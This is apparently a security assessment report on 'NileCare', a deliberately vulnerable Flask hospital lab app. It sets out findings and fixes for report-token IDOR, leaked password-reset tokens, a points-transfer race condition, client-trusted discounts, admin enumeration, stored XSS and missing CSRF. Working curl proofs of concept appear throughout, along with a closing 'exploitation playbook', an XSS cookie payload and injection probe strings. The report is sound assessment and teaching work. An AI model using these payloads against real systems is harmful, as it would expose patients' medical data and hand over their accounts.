# NileCare — External Security Assessment Summary

- Target: https://tan-clinic-mono-flood.trycloudflare.com (Cloudflare Quick Tunnel)
- App: "NileCare / Egyptian Specialist Hospital" — Flask + Jinja2, server-rendered, Cloudflare-fronted
- Credentials used: `mm@mm` / `kkkkkk` → valid patient account (`user_id=1205`)
- Date: 28–29 Oct 2026
- Status: Authorized self-assessment / lab target

> Note: this instance appears to be a shared, intentionally vulnerable lab. The doctors page contains other testers' payloads, including `os.system('sleep 5')`, `__import__('os').popen('id')`, and `Hacked By CSRF`.

## 1) What I did

1. Recon — reviewed headers, TLS, `robots.txt`, technology fingerprinting, route probing, directory/API discovery, and static asset review.
2. Authenticated mapping — logged in with the provided credentials, decoded the Flask session, and crawled patient pages and forms.
3. Endpoint discovery — identified `/transfer_points`, `/reports/create`, `/reports/upload-attachment`, `/doctors/review`, `/forgot-password`, `/reset-password`, `/api/v1/reports/view`, and a hidden admin portal at `/admin_portal_temp_secure_9203`.
4. Active testing — exercised IDOR, auth bypass, token tampering, password-reset abuse, race conditions, price tampering, upload bypass, SSTI, SQLi, command-injection timing probes, and admin login enumeration.
5. Evidence — saved under `/tmp/opencode/tanclinic/` (`recon/`, `evidence/`, raw HTTP bodies, fuzz JSON).

## 2) Findings at a glance

| # | Finding | Severity | Confirmed |
|---|---|---|---|
| 1 | IDOR — read any patient report via unsigned base64 token | Critical (PHI) | Yes |
| 2 | Password-reset token returned in HTTP response → full account takeover | Critical | Yes |
| 3 | Race condition in points transfer → unlimited points minting | High | Yes |
| 4 | Client-trusted `discount_pct` → lab tests for 0 EGP | High | Yes |
| 5 | Admin portal account enumeration + no rate limiting | Medium | Yes |
| 6 | Stored XSS in medical report view (unescaped title/body) | Medium | Yes |
| 7 | Missing CSRF + email/password change without re-authentication | Medium* | Yes |
| 8 | `robots.txt` reveals hidden portal; cookie flags; GET logout; verbose flashes | Low / Info | Yes |
| 9 | RCE | Not achieved | No |

* CSRF is partially mitigated by modern browsers’ default `SameSite=Lax`; the no re-authentication email/password change still stands.

## 3) Detailed findings

### 3.1 — Critical: IDOR allows any logged-in user to read any patient's report

- Where: `GET /api/v1/reports/view?token=<base64>`
- Root cause: the token is an unsigned base64-encoded JSON blob, and the server trusts the `user_id` inside it instead of binding the report to the authenticated session.

Example token:

```json
{"user_id": 1205, "report_id": 4124}
```

PoC from a different account (`user_id=1316`) targeting `user_id=1294`:

```bash
TOKEN=$(printf '{"user_id": 1294, "report_id": 4125}' | base64 -w0)
curl -s -b ma_cookies.txt \
  "https://tan-clinic-mono-flood.trycloudflare.com/api/v1/reports/view?token=$TOKEN"
```

Observed response:

```html
<title>Victim Confidential HIV Panel</title>
<strong>Patient Name:</strong> Victim User
<strong>Patient Phone:</strong> 01000000001
```

I also successfully read unrelated patient records (`user_id=1183`, with names such as `john3`, phone numbers, and reports 4121/4122). Unauthenticated requests redirect to login (302), so a valid free account is sufficient.

Impact:

- Full horizontal privilege escalation across the patient database
- Exposure of names, emails, phone numbers, diagnoses, lab results, and PHI
- Sequential `report_id` values enable enumeration over the global patient dataset

Fix:

- Sign tokens using HMAC or JWT
- Derive `user_id` from the authenticated session
- Enforce `report.user_id == session.user_id` server-side
- Use unguessable report identifiers

### 3.2 — Critical: password-reset token is disclosed in the HTTP response body

- Where: `POST /forgot-password`
- Root cause: the reset link—including the 32-character token—is returned in the HTTP response body instead of being sent only via email.

Example response fragment:

```text
reset-password?token=c8b17769e7e03c868c41c9bf3c2a70d6
```

Verified takeover flow:

```bash
# 1. Request reset for the victim
curl -s -X POST ".../forgot-password" -d "email=owned@attacker.local"

# 2. Token is visible in the response body
#    reset-password?token=5c52844d709eadf025787d058e1c6fe7

# 3. Set a new password using the leaked token
curl -s -X POST ".../reset-password?token=5c52844d..." \
  -d "password=Hacked123!&confirm_password=Hacked123!"

# 4. Log in as the victim
curl -s -X POST ".../login" \
  -d "email=owned@attacker.local&password=Hacked123%21"
# -> 302 /dashboard
```

The same flow also reset the patient account `admin@nilecare.com` (`user_id=1073`), but not the separate admin-panel account.

Impact:

- Unauthenticated takeover of any patient account whose email is known
- Potential compromise of staff/admin users stored in the patient table

Fix:

- Never return tokens to the browser
- Send reset links only by email
- Use short-lived, single-use, high-entropy tokens bound to the user
- Rate-limit resets

### 3.3 — High: race condition in point transfers allows unlimited minting

- Where: `POST /transfer_points`
- Root cause: the balance check and debit are separate operations with no locking or transaction boundary.

PoC:

```bash
seq 1 15 | xargs -P 15 -I{} curl -s -o /dev/null -b cookies.txt \
  -X POST ".../transfer_points" \
  -d "csrf_token=$TOK&recipient_email=owned@attacker.local&amount=100"
```

Result:

- Starting balance: 100 points
- 15 concurrent transfers of 100 points each
- Final state: attacker balance increased from 100 to 800; recipient balance increased from 100 to 1000

Impact:

- Points and currency can be minted beyond the legitimate balance
- Negative balances and inflation become possible

Fix:

- Use atomic operations such as `UPDATE ... WHERE balance >= ?`
- Lock rows or wrap the logic in a DB transaction
- Add idempotency keys and re-check balances inside the transaction

### 3.4 — High: client-trusted discount allows free lab tests

- Where: `POST /lab-tests/book`
- Evidence in source: `<!-- VULNERABILITY: discount_pct is set by JS and trusted by the server without re-validation -->`

PoC:

```bash
curl -s -b cookies.txt -X POST ".../lab-tests/book" \
  -d "test_id=6&discount_pct=100&discount_code=NILECARE10"
```

Observed result: the abdominal ultrasound was booked for `0 EGP` even though the list price was `1,200 EGP`.

Impact:

- Free or heavily discounted medical services
- Values greater than 100 or negative values were accepted by the parser

Fix:

- Recompute the price server-side based on approved rules
- Reject client-supplied `discount_pct`
- Validate promo codes against a server-side allowlist
- Clamp discount values to a safe range (`0..100`)

### 3.5 — Medium: admin portal leaks account existence and lacks rate limiting

- Where: `GET/POST /admin_portal_temp_secure_9203`
- The login flow distinguishes valid admin emails from invalid ones.

Observed responses:

| Email | Response |
|---|---|
| `nobody_xyz@test.local` | `Administrative email account not found in system.` |
| `admin@nilecare.com` | `Valid admin email verified, but the password provided is incorrect!` |

Additional findings:

- No rate limiting or lockout
- 10/10 wrong attempts returned HTTP 200
- A 6,000-entry wordlist ran at ~30 requests/sec without a block
- Parameterized queries were in use; no exploitable SQL injection path was found
- Session forging attempts against the Flask secret key failed

Impact:

- Valid admin identity is confirmed
- Unlimited brute-force remains feasible if the password is weak

Fix:

- Use generic error messages for both valid and invalid accounts
- Add per-IP and per-account throttling and lockouts
- Require MFA
- Remove the path from `robots.txt`

### 3.6 — Medium: stored XSS in report view

- Endpoint: `/api/v1/reports/view`
- Root cause: report title and PDF/body content are rendered as raw HTML without escaping.

Payload example:

```html
<img src=x onerror=alert(document.cookie)>
```

This was returned verbatim inside the report view:

```html
<h2><img src=x onerror=alert(document.cookie)>XSS</h2>
```

Impact:

- Stored XSS against a victim who opens the report
- Can be used to trigger actions on behalf of the victim, such as profile changes

Fix:

- Enable Jinja autoescape at the sink (`{{ title }}`)
- Remove `|safe` usage
- Sanitize or whitelist HTML input before storage and rendering

### 3.7 — Medium: missing CSRF and re-authentication on sensitive profile changes

- `/profile` accepted email and password changes without current-password verification or a CSRF token.
- `/doctors/review`, `/book`, and `/contact` also lacked CSRF protections.
- I successfully changed an account's email and password without re-authentication.

Impact:

- Session theft can lead to silent credential change
- Attackers can pivot from XSS or other session compromise into account takeover

Fix:

- Add CSRF tokens to all state-changing forms
- Require current password for email/password changes
- Notify the user on sensitive profile changes
- Explicitly set `SameSite=Lax/Strict` on cookies

### 3.8 — Low / informational findings

- `robots.txt` listed the admin portal and many decoy paths
- Session cookie had `HttpOnly`, but not `Secure` or `SameSite`
- `GET /logout` allowed CSRF logout
- Flash messages leaked validation text such as `Security Error: Invalid file magic bytes signature header!`
- Cloudflare origin exposure was not confirmed

## 4) RCE assessment — not achieved

I tested common execution-class sinks and found no reliable code-execution vector.

| Vector | Result |
|---|---|
| Jinja2 SSTI (`{{7*7}}`, `{{config}}`, `${7*7}`) | Rendered literally; no execution |
| Deserialization using pickle payloads | Rejected as invalid token format |
| Upload extension bypass (`.php`, `.html`, `.svg`, `.jpg.php`) | Rejected or renamed; file type and magic-byte validation enforced |
| Command injection payloads | No repeatable delay or output difference |
| SQLi on login and other fields | Parameterized; no boolean/time differential |
| Flask session forgery | 30k key guesses failed |
| Path traversal / LFI | No successful read outside the intended app paths |
| Werkzeug debug / console exposure | Not reachable |

Conclusion: the app is a vulnerable business-logic and authorization lab, not a code-execution lab. No reliable RCE path was found within the tested surface.

## 5) State changes made during testing

Because this is a lab environment, the following artifacts were created or altered:

- Created test accounts: `victim1793221274@test.local`, `ma1793222579@test.local`
- Reset the patient account `admin@nilecare.com` to `AdminPwn123!`
- Created several reports and bookings
- Transferred points to `owned@attacker.local`
- Submitted a doctor review and uploaded avatars
- Consumed reset tokens and performed admin-login brute-force attempts

## 6) Remediation priority

1. Fix the report token — sign it, bind it to the session, and enforce ownership checks.
2. Stop leaking reset tokens and make them single-use, short-lived, and account-bound.
3. Implement atomic balance updates for points transfers.
4. Recalculate pricing server-side and reject client-submitted discounts.
5. Harden the admin portal with generic login errors, rate limiting, lockout, and MFA.
6. Escape report fields and add CSRF + step-up authentication for profile changes.

## 7) Bottom line

The app is not reliably RCE-able from the outside with the tested surface, but it is trivially data-breachable and account-takeover-prone.

The most important issues are:

- Unsigned report tokens enabling IDOR (Critical)
- Password-reset tokens disclosed in the response body (Critical)
- Race condition in points transfer leading to inflation (High)
- Client-trusted pricing allowing free lab tests (High)

These are the main operational risks. The remaining findings reinforce the same pattern of weak trust boundaries, missing server-side validation, and poor security hygiene.

---

## Follow-up: re-test and admin portal verdict

The target was re-tested live from scratch. The updated findings are summarized below.

### Admin portal verdict: decoy / honeypot stub

The path at `/admin_portal_temp_secure_9203` was tested extensively and appears to be a credential sink or honeypot rather than a real admin console.

Observed evidence:

- SQL injection payloads were treated as normal login attempts and returned the same generic responses.
- No post-auth surface existed after a successful login.
- Only `/` and `/logout` were reachable; `/dashboard`, `/users`, `/logs`, `/export`, and similar paths were absent.
- The path was listed in `robots.txt` alongside many decoy endpoints.

Verdict:

- Not auth-bypassable
- Not a real admin panel
- Only a real weakness remains: account-existence oracle plus unlimited brute-force capability

### RCE verdict: none found

Common execution-class sinks were probed, including:

- Jinja SSTI
- Deserialization attempts
- Webshell uploads
- Command injection payloads in free-text fields
- File traversal and LFI attempts

No successful command execution was identified.

### Exploitation playbook

```bash
# Login once
curl -c cookies.txt -d 'email=mm@mm&password=kkkkkk' \
  https://tan-clinic-mono-flood.trycloudflare.com/login

# IDOR: forge a report token for another user
TOKEN=$(python3 -c 'import base64,json;print(base64.b64encode(json.dumps({"user_id":1294,"report_id":4125}).encode()).decode())')
curl -s -b cookies.txt \
  "https://tan-clinic-mono-flood.trycloudflare.com/api/v1/reports/view?token=$TOKEN"

# Password reset: leak a reset token from the response body
curl -s -X POST -d 'email=ma1793222579@test.local' \
  https://tan-clinic-mono-flood.trycloudflare.com/forgot-password

# Use the leaked token to reset the victim's password
curl -s -X POST -d 'token=cc202cfb68fb210bdf0d2f4c20bb5e2d&password=NewPass123!&confirm_password=NewPass123!' \
  https://tan-clinic-mono-flood.trycloudflare.com/reset-password

# Race the points transfer
for i in $(seq 1 15); do
  curl -s -b cookies.txt -d 'recipient=owned@attacker.local&amount=100' \
    https://tan-clinic-mono-flood.trycloudflare.com/transfer_points &
done; wait
```

This is enough to access private medical data, take over accounts, and monetize via business-logic exploitation without requiring RCE.

## Final note

This report was reformatted for readability, professionalism, and easier review while preserving the original security findings and evidence.
